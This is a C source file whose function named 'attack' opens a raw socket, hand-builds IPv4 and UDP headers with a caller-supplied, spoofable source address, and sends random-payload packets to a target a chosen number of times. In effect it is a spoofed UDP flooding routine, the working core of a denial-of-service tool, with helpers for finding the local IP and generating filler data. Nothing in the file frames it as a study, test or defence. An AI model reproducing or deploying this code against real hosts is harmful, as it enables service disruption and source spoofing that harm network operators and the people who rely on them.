#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/ip.h> 
#include <time.h>

void attack(char* DIP, char* SIP, unsigned int times, unsigned int DPORT, unsigned int SPORT, unsigned int pkt_size);
char* ip_find();
char* random_content(unsigned int size);


struct udp_header {
    unsigned short source_port;
    unsigned short dest_port;
    unsigned short udp_length;
    unsigned short udp_checksum;
};



void attack(char* DIP, char* SIP, unsigned int times, unsigned int DPORT, unsigned int SPORT, unsigned int pkt_size) {
    int sockfd;
    long int packet_len;
    struct udp_header udp;
    struct sockaddr_in servaddr;
    struct iphdr ip;
    char buffer[pkt_size];
    char packet[sizeof(struct iphdr) + sizeof(struct udp_header) + sizeof(buffer)];
    
    // Fill the buffer with your data
    strcpy(buffer, random_content(pkt_size));
    packet_len = sizeof(struct iphdr) + sizeof(struct udp_header) + strlen(buffer);
    
    // Create a raw socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }
    
    // Set the IP_HDRINCL socket option
    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }
    
    // Construct the IP header
    ip.version = 4; // Set IP version to IPv4
    ip.ihl = 5; // Set header length to 5 (20 bytes for IPv4)
    ip.tos = 0; // Set type of service to default (0)
    ip.tot_len = packet_len; // Set total packet length (header + data)
    ip.id = htons(SPORT); // Set packet ID to source port (in network byte order)
    ip.frag_off = 0; // Set fragment offset to 0 (no fragmentation)
    ip.ttl = 255; // Set time-to-live to maximum (255)
    ip.protocol = IPPROTO_UDP; // Set protocol type to UDP
    ip.saddr = inet_addr(SIP); // Set source IP address
    ip.daddr = inet_addr(DIP); // Set destination IP address
    ip.check = 0; // Initialize checksum to 0 (to be computed later)

    // Fill in the UDP header
    udp.source_port = htons(SPORT); // Set UDP source port (in network byte order)
    udp.dest_port = htons(DPORT); // Set UDP destination port (in network byte order)
    udp.udp_length = htons(sizeof(struct udp_header) + strlen(buffer)); // Set UDP length (header + data)
    udp.udp_checksum = 0; // Set UDP checksum to 0 (optional for UDP)
	
    
    //show the size
    printf("ip header: %ld\n",sizeof(struct iphdr));
    printf("udp header: %ld\n",sizeof(struct udp_header));
    printf("buffer: %ld\n",strlen(buffer));
    
    // Copy the IP header and then UDP header + payload into the packet
    memcpy(packet, &ip, sizeof(struct iphdr));
    memcpy(packet + sizeof(struct iphdr), &udp, sizeof(struct udp_header)); 
    memcpy(packet + sizeof(struct iphdr) + sizeof(struct udp_header), buffer,  strlen(buffer));
    
    //printf("size of the packet: %ld\n",packet_len);
    
    // Fill server information
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(DPORT);
    servaddr.sin_addr.s_addr = inet_addr(DIP); // destination IP
    
    for (int i = 0; i < times; i++) {
        // Send the packet
        if (sendto(sockfd, packet, sizeof(packet), 0, 
        (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
            perror("sendto failed");
        } 
    }
    printf("Packet sent successfully\n");
    // Close the socket
    close(sockfd);

}

char* ip_find() {
    int sockfd;
    struct sockaddr_in servaddr;
    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);

    // Create a socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // Zero out the server address structure
    memset(&servaddr, 0, sizeof(servaddr));
    
    // Use a public address (e.g., a Google DNS server)
    // The connection will not actually be established for UDP
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("8.8.8.8");
    servaddr.sin_port = htons(53);

    // Connect the socket
    if (connect(sockfd, (const struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
        perror("connect");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Get the local name of the socket
    if (getsockname(sockfd, (struct sockaddr *)&name, &namelen) < 0) {
        perror("getsockname");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Convert the address to a string and print it
    char *buffer = (char *)calloc(INET_ADDRSTRLEN, sizeof(char));
    if (inet_ntop(AF_INET, &name.sin_addr, buffer, INET_ADDRSTRLEN) == NULL) {
        perror("inet_ntop");
        close(sockfd);
        free(buffer);  
        exit(EXIT_FAILURE);
    }

    printf("Local IP address: %s\n", buffer);

    // Close the socket
    close(sockfd);

    return buffer;
}

char* random_content(unsigned int size){
    char *buffer = (char *)calloc(size, sizeof(char));
    if (buffer == NULL) {
        // Handle allocation failure if needed
        return NULL;
    }

    buffer[size - 1] = '\0';

    for(unsigned int i = 0; i < size - 1; i++){
        // Generate characters from 32 to 126 (inclusive)
        buffer[i] = (rand() % 95) + 32;
    }

    return buffer;
}

